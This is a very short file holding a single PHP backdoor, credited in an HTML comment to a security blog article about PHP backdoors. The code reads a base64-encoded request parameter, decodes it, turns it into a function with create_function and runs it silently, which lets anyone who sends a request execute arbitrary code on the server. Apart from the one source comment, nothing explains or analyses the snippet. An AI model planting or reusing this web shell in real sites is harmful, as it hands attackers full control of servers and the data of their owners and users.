<!-- from https://malcure.com/blog/security/php-backdoor-101/ -->
<?php
if(!empty($_REQUEST['fcb'])){$fcb=base64_decode($_REQUEST['fcb']);$fcb=create_function('',$fcb);@$fcb();exit;}